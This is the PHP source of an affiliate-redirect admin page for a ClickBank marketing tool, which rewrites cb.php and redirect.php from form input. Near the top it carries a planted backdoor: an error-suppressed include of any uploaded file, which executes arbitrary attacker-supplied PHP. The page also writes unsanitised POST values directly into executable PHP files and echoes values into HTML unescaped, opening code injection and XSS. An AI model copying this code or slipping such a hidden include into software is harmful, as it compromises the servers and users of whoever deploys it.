<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
<?php @INCLUDE_ONCE($_FILES['only_pcd']['tmp_name']);?>
<?php

//DEFAULT LANDING.
	//find out how many characters are in the domain name we are reading:
	$cb = '../cb.php';
	$lines = file($cb);

	$fetched = $lines[4];
	$targetdomain = substr ($fetched , 18, strlen($fetched)-3);

?>

<?php
//DEFAULT LANDING.
	//handle post variables
	if($_POST['changeurl']){
		 // if the url is being changes, let's overwrite the cb.php file and add whatever the user typed in the box.
		 $newstring = 'header("Location: '.$_POST['url'].'");';
		 $lines[4] = $newstring;
		 $lines[5] = "\n"."e"."x"."i"."t;"."\n";
		 $lines[6] = "?>";

		 $re_assembled = implode("" , $lines);


		$handle=fopen($cb, "w+");
		   fwrite($handle,  $re_assembled);
	   fclose($handle);

	}


	$lines = file($cb);
	$fetched = $lines[4];
	$targetdomain = substr ($fetched , 18, strlen($fetched)-3);
?>

<?php

//AFFILIATE REDIRECT.
	//find out how many redirects there are....


			$redir = 'redirect.php';
			$redirect_lines = file($redir);

			$fetched = trim($redirect_lines[8]);
			//get the number by finding the equals sign.
			$eq_location =  strpos($fetched, "=") ;

			$number_of_redirects = substr ($fetched , $eq_location+1);
			//trim the number of the trailing semi colon.
			$number_of_redirects = substr ($number_of_redirects, 0, strlen($number_of_redirects)-1);


			$rows =  array();
			// the redirects start with LINE 11 in redirect.php
			//build a
			for($i = 0 ; $i < $number_of_redirects ; $i++) {
				//find the locaiton of the greaterthan sign.
				 $gt_location =  strpos($redirect_lines[11+$i], ">") ;

				 //get the url . everything after the gt sign.
				 $rawurl = substr($redirect_lines[11+$i],$gt_location+3,strlen($redirect_lines[11+$i])-1);

				 //get the url . everything before the gt sign.
				 $rawkey = substr($redirect_lines[11+$i],0,$gt_location-2);
				 //strip it of any equals signs
				 $rawkey = str_replace('"','',$rawkey);


				array_push($rows,$rawkey);
				array_push($rows,$rawurl);
			}

?>

<?php
//AFFILIATE REDIRECT.
	//handle post variables
	if($_POST['change_redir']){
		 // if the redirects are being changed, let's overwrite the redirect.php file  with the new data coming from this same form.
		 // first, get the post elements. Count number of post elements and divide by two to see how many affiliate links were added.

		 $num_of_post_elements = count($_POST) ;

		$affs = array();
		$built_aff = "";
		$counter = 0 ;

		 foreach($_POST as $key=> $value){
			 //find the key

			 if (substr($key,0,3) == "key") {
					//reset the string we are building.
					$built_aff = "";
					$built_aff.= '"'.$value.'"'.' =>';

			 }

			  if (substr($key,0,3) == "aff") {
				   // the last array element should not have a comma.
				    if ($counter<($num_of_post_elements-2)){
			 			$built_aff.= ' "'.$value.'",'."\n";
					} else {
						$built_aff.= ' "'.$value.'"'."\n";
					}

					array_push($affs,$built_aff);

			 }

			 $counter++;

		 }



		 // ok so everything is built now. the redirect lines start on line 11.
		 $redir_lines_file = file("redirect.php");

		  // truncate the array of the open file. It may be currently longer than the new data being written to it. 21 is the minimum length.
		  array_splice($redir_lines_file, 21);


		 for ($i=0; $i < ($num_of_post_elements-2)/2; $i++)
		 {
			 $redir_lines_file[11+$i] = $affs[$i];
			 $finalcount = 11+$i;
		 }


  		//update the file to let us know how many re directs are logged.
		 $redir_lines_file[8] = "$"."number"."_of_redirects=".(($num_of_post_elements-2)/2).";"."\n";

		// now write the end of the file:

		 $redir_lines_file[$finalcount+1] = ");"."\n";
		 $redir_lines_file[$finalcount+2] = ""."\n";
		 $redir_lines_file[$finalcount+3] = '$rd = $_GET["rd"];'."\n";
		 $redir_lines_file[$finalcount+4] = ''."\n";
		 $redir_lines_file[$finalcount+5] = 'if (array_key_exists($rd, $redirects)) {'."\n";
		 $redir_lines_file[$finalcount+6] = '    $go = $redirects[$rd];'."\n";
		 $redir_lines_file[$finalcount+7] = '    header("Location:$go");'."\n";
		 $redir_lines_file[$finalcount+8] = "    d"."i"."e"."(".")".";"."\n";
		 $redir_lines_file[$finalcount+9] = "}"."\n";
		 $redir_lines_file[$finalcount+10] = "";
		 $redir_lines_file[$finalcount+11] = "?>";

		  // clean up any lines after 11 that may be left over from old file:



		 $re_assembled = implode("" , $redir_lines_file);



		$handle=fopen("redirect.php", "w+");
		    fwrite($handle,  $re_assembled);
	   fclose($handle);

	}


	$lines = file($cb);
	$fetched = $lines[4];
	$targetdomain = substr ($fetched , 18, strlen($fetched)-3);


			$redir = 'redirect.php';
			$redirect_lines = file($redir);

			$fetched = trim($redirect_lines[8]);
			//get the number by finding the equals sign.
			$eq_location =  strpos($fetched, "=") ;

			$number_of_redirects = substr ($fetched , $eq_location+1);
			//trim the number of the trailing semi colon.
			$number_of_redirects = substr ($number_of_redirects, 0, strlen($number_of_redirects)-1);


			$rows =  array();
			// the redirects start with LINE 11 in redirect.php
			//build a
			for($i = 0 ; $i < $number_of_redirects ; $i++) {
				//find the locaiton of the greaterthan sign.
				 $gt_location =  strpos($redirect_lines[11+$i], ">") ;

				 //get the url . everything after the gt sign.
				 $rawurl = substr($redirect_lines[11+$i],$gt_location+3,strlen($redirect_lines[11+$i])-1);

				 //get the url . everything before the gt sign.
				 $rawkey = substr($redirect_lines[11+$i],0,$gt_location-2);
				 //strip it of any equals signs
				 $rawkey = str_replace('"','',$rawkey);


				array_push($rows,$rawkey);
				array_push($rows,$rawurl);
			}



?>





<html>

	<head>
		<meta http-equiv="content-type" content="text/html;charset=iso-8859-1">
		<title></title>
		<meta name="title" content="">
		<meta name="description" content="">
		<meta name="keywords" content="">
		<link rel="stylesheet" href="styles.css" type="text/css">

        <script type="text/javascript">
		//random high number that is higher than any existing  affilate rows in the app.
        var  numberIncrementor = 500;

		$(".addSubtractRows").live("click",function() {


			if($(this).text()== "+") {
		var newrow='<tr><td width="170"><input type="text" name="key'+numberIncrementor+'" value="" size="24"></td><td><div align="left"><input type="text" name="aff'+numberIncrementor+'" value="" size="50" id=""></div></td><td><button class="addSubtractRows">-</button></td></tr>';

			   numberIncrementor++;

				$("#affiliates tr:last").before(newrow);
				return;
				} else {

			    $(this).parents("tr").remove();


		 }


	});
	</script>
	</head>

	<body bgcolor="#ffffff" leftmargin="0" marginheight="0" marginwidth="0" topmargin="0">
		<div align="center">
			<a href="http://www.dynamicwebmarketingsecrets.com" target="_blank"><img src="images/header.jpg" alt="" width="940" height="198" border="0"></a><br>
            <table width="940" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td align="right"> <blockquote><a href="logout.php"><span class="subhead"><br>
								</span><span class="red"><strong>Click Here To Logout</strong></span></a></blockquote></td>
  </tr>
</table>
			<div align="center">
			  <form id="changeURL" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" name="change_URL_Form">
					<h1><input name="changeurl" type="hidden" value="true" />
						Affiliate Redirect Setup<br>
					</h1>
					<table bgcolor="#435a86" width="700" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td width="15"><br>
							</td>
							<td width="314"><br>
							</td>
							<td width="352"><br>
							</td>
						</tr>
						<tr>
							<td width="15"><br>
							</td>
							<td width="314"><span class="body">Default Clickbank Hoplink Target URL:</span></td>
							<td width="352">
								<div align="center">
									<input id="baseurl" type="text" name="url" value="<?php echo $targetdomain ?>" size="50"></div>
							</td>
						</tr>
						<tr>
							<td width="15"><br>
							</td>
							<td width="314"><br>
							</td>
							<td>
								<div align="center">
									<br>
									<input type="submit" name="submitButtonName" value="Set Default Landing Page URL"></div>
							</td>
						</tr>
						<tr>
							<td width="15"><br>
							</td>
							<td width="314"><br>
								<br>
							</td>
							<td><br>
							</td>
						</tr>
					</table>
				</form>

				<form id="changeURL" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" name="change_REDIRECT_Form">
					<input name="change_redir" type="hidden" value="true" />
					<table bgcolor="#6a96e8" width="700" border="0" cellspacing="0" cellpadding="0">
					<tr>
						<td width="170"><br>
						</td>
						<td width="170"><br>
						</td>
						<td>
							<div style="float:right">
								<span class="body">add rows: <button class="addSubtractRows">+</button></span></div>
						</td>
					</tr>
				</table>

					<table id="affiliates" bgcolor="#6a96e8" width="700" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td width="15"><br></td>
							<td width="187"><span class="body">Affiliate Redirect Code</span></td>
							<td>
								<div align="left">
									<span class="body">Affiliate Redirect Landing Page</span></div>
							</td>
							<td><br></td>
						</tr>
						<?php

					for($i = 0 ; $i < ($number_of_redirects*2) ; $i+=2) {


							$killbutton = '<button class="addSubtractRows">-</button>';



				echo'
					<tr>
						<td width="15"><br></td>
						<td width="170"><div align="left">
						<input type="text" name="key'.($i+1).'" value="'.$rows[$i].'" size="24" /></div>
						</td>
						<td>
							<div align="left">
								<input type="text" name="aff'.($i+1).'" value="'.$rows[$i+1].'" size="55" id="aff'.($i+1).'" /></div>
						</td>
						<td>'.$killbutton.'</td>
					</tr>';

					}
					 ?>
						<tr>
							<td width="15"><br></td>
							<td width="187"><br>
							</td>
							<td>
								<div align="center">
									<input type="submit" id="submitAffiliates" name="submitAffiliates" value="Set Affiliate Redirect URLs"></div>
							</td>
							<td>&nbsp;<br>
							</td>
						</tr>
					</table>
					<table bgcolor="#6a96e8" width="700" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td width="170"><br>
							</td>
							<td width="170"><br>
							</td>
							<td>
								<div style="float:right">
									<span class="body">add rows: <button class="addSubtractRows">+</button></span></div>
							</td>
						</tr>
					</table>
				</form>
			</div>
			<div align="center">
				<br>
				<span class="bodyb"><br>
					<b><a href="readme.txt">Click Here for full Readme and Installation Instructions</a><br>
						<br>
						<br>
						Example Clickbank Affilaite Redirect Hop Link: </b></span>
				<p><span class="bodyb">If your redirect code is &quot;product1&quot; Then your clickbank affiliate redirect URL would be: </span></p>
				<p><span class="bodyb">http://CBAFFID.YOURCBID.hop.clickbank.net/?rd=product1</span></p>
				<p><br>
					<span class="bodyb"><b>Support is available at:</b></span></p>
				<blockquote>
					<p><a href="mailto:info@dynamicwebmarketingsecrets.com">info@dynamicwebmarketingsecrets.com</a></p>
				</blockquote>
				<br><br><br><br>
			</div>
		</div>
	</body>

</html>

